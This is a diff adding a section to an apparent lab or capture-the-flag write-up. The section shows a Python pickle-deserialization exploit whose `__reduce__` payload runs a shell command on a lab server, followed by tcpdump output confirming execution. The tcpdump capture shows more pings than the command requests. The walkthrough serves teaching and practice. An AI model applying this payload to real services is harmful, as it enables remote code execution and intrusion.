@@ -246,3 +246,36 @@ If now in the text field I write "hello" and now try to use the `/checklist` fun
     
 Now we need to test with serialization to run commands. We need to create a Python script for this, get your keyboards ready.
 
+    #coding:utf-8
+
+    import os
+    import cPickle
+    import hashlib
+    import requests
+
+    class CommandExecute(object):
+      def __reduce__(self):
+        return (os.system, ('ping -c 2 192.168.0.17',))
+
+    convert_data  = cPickle.dumps(CommandExecute()) # The message that will be sent to the server with the command.
+    convert_crypt = hashlib.md5(convert_data).hexdigest()
+
+    send_requests  = requests.post('http://192.168.0.44:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
+    check_requests = requests.post('http://192.168.0.44:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
+    print(check_requests.text)
+    
+When we run the script, the server returns ICMP queries to us, so the command was successfully executed by the server. We are on the right track.
+
+    # tcpdump -i wlan0 icmp -n
+    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+    listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+    14:03:53.499955 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 1, length 64
+    14:03:53.500017 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 1, length 64
+    14:03:54.528969 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 2, length 64
+    14:03:54.529072 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 2, length 64
+    14:03:55.553021 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 3, length 64
+    14:03:55.553110 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 3, length 64
+    14:03:56.577171 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 4, length 64
+    14:03:56.577245 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 4, length 64
+    14:03:57.578394 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 5, length 64
+    14:03:57.578461 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 5, length 64
